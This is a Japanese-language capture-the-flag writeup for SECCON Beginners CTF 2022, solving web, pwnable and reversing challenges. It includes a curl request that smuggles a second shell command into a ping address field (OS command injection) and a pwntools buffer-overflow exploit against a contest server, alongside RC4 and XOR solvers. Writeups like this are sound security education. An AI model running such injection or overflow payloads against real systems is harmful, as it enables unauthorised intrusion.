# SECCON Beginners CTF 2022 Writeup

## はじめに

今年は1人チームで参加して、reversingを中心に何問か解いていました。reversingは全問解けて、hardの問題でFirst Bloodを取ることもできたので良かったです。

運営の皆さま、素晴らしいCTFを開催してくださりありがとうございました！

## web

### Util

配布されたソースコードを読むことで、標的となるウェブサービスにはOSコマンドインジェクションが可能な脆弱性が存在することがわかります。クライアントサイドにはJavaScriptを用いた簡単な入力内容のチェックが存在しますが、以下のようにcurlで直接POSTすることでチェックを回避し解くことができます。

```
curl -X POST -H "Content-Type: application/json" -d '{"address": "127.0.0.1;cat /flag_A74FIBkN9sELAjOc.txt"}' https://util.quals.beginners.seccon.jp/util/ping
```

## pwnable

### BeginnersBof

バッファオーバーフローを引き起こして `win` 関数を呼び出すことでFlagが得られます。

```python
from pwn import *
from struct import pack

elf = ELF('./chall')
addr_win = elf.symbols['win']

r = remote('beginnersbof.quals.beginners.seccon.jp', 9000)

payload = b'A' * 40
payload += pack("<Q", addr_win)
r.sendline(b'100')
r.sendline(payload)

r.interactive()
```

## reversing

### Quiz

暗号化/エンコード等されていないFlagが実行ファイルに含まれているので、`strings` などのツールを使って解けます。

```
strings ./quiz | grep ctf4b
```

### WinTLS

Windowsのスレッドローカルストレージというスレッド単位で利用することができる静的な変数を題材とした問題です。`CreateThread` 関数によって呼び出されている `t1` , `t2` という関数の処理を読み解くことで、Flagを求めることができます。

```python
tls1 = 'c4{fAPu8#FHh2+0cyo8$SWJH3a8X'
tls2 = 'tfb%s$T9NvFyroLh@89a9yoC3rPy&3b}'
flag = [''] * 0xff

x = 0
for i in range(60):
    if i % 3 == 0 or i % 5 == 0:
        flag[i] = tls1[x]
        x += 1

x = 0
for i in range(60):
    if i % 3 != 0 and i % 5 != 0:
        flag[i] = tls2[x]
        x += 1

print(''.join(flag))
```

### Recursive

問題名の通り、再帰関数を用いて入力が正しいか（Flagかどうか）判定するプログラムが配布されます。ハードコードされたバイト列を抽出し、以下のようにFlagを求めるスクリプトを作成/実行して解くことができます。

```python
flag = ''
table = bytes.fromhex('6374602A6634282B62633935222E3831627B686D7233632F7D72403A7B263B3531346F642A3C682C6E27646D78773F6C656728796F296E652B6A2D7B2860712F7272337C2824302B35732E7A7B5F6E63617572247B733176352521702968217127743C3D6C405F386839335F776F63346C64253E3F6362613C646167787C6C3C622F792C79606B2D377B3D3B7B26382C387535246B6B637D403771403C746D30333A262C663176796227382564796C3228673F3731377123753E66772829766F6F243667293A295F635F2B38762E67626D28252477283C683A312163277275767D4033607961217235263B357A5F6F676D306139633233736D772D2E69237C777B386B65706676773A337C3366353C65403A7D2A2C713E73672162646B72307837403E682F352A68693C373439277C7B29736A313B302C2469672676293D7430666E6B7C30336A227D37727B7D74697D3F5F3C7377786A75316B216C266462216A3A7D217A7D362A60315F7B6631734033642C76696F34353C5F3476635F76333E6875333E2B62797671232340662B296C633931772B39693723763C723B72722475402861743E766E3A3762606A736D67366D797B2B396D5F2D727970705F75356E2A362E7D66387070673C6D2D267171356B33663F3D75317D6D5F3F6E393C7C65742A2D2F256667682E316D28405F3376663469286E2973326A7667306D34')

def check(input, x):
    global flag
    if len(input) == 1:
        flag += chr(table[x])
    else:
        a = int(len(input) / 2)
        check(input[:a], x)
        check(input[a:], x + a * a)

check('A'*38, 0)
print(flag)
```

### Ransom

実行ファイル、暗号化されていると思われるファイル、pcapファイルが配布されます。実行ファイルの処理を読み解くことで、ファイルがRC4によって暗号化されていることがわかり、更に鍵はソケット通信で外部に送信されていることがわかります。Wireshark等のツールでpcapファイルから鍵を探し出し、それを用いてファイル内のデータを復号することでFlagが得られます。

```python
from Crypto.Cipher import ARC4

key  = b'rgUAvvyfyApNPEYg'
enc = b'\x2b\xa9\xf3\x6f\xa2\x2e\xcd\xf3\x78\xcc\xb7\xa0\xde\x6d\xb1\xd4\x24\x3c\x8a\x89\xa3\xce\xab\x30\x7f\xc2\xb9\x0c\xb9\xf4\xe7\xda\x25\xcd\xfc\x4e\xc7\x9e\x7e\x43\x2b\x3b\xdc\x09\x80\x96\x95\xf6\x76\x10'

cipher = ARC4.new(key)
dec = cipher.decrypt(enc)
print(dec)
```

### please\_not\_debug\_me

簡単なパッカーでパックされている実行ファイルが配布されているので、まずはアンパックしましょう。

```python
dat = open('please_not_debug_me','rb').read()
dat = dat[0x3020:]
dat = bytearray(dat)
for i in range(len(dat)):
    dat[i] = dat[i] ^ 0x16

open('unpacked.elf','wb').write(dat)
```

抽出した実行ファイルを解析すると、RC4で入力を暗号化して、ハードコードされたバイト列と暗号化後のデータを比較することで入力が正しい（Flagかどうか）判定していることがわかります。以下のようなソルバを書くことでFlagを復号化することができます。

```python
from Crypto.Cipher import ARC4

key = bytearray(bytes.fromhex('6231346265376032693C686F6A3B6D6E7126232B232D21242C2F2F787924292F4411164510101F43'))
enc = bytes.fromhex('27D9653A0F25E40E818A59BC33FBF9FC05C63301E2B0BE8E4A9CA94673B8487D7F7322ECDBDC98D99061807C6CB336423F9044850D95B1EEFA94850CB99F')

for i in range(40):
    key[i] = key[i] ^ i

cipher = ARC4.new(bytes(key))
dec = cipher.decrypt(enc)
print(dec)
```
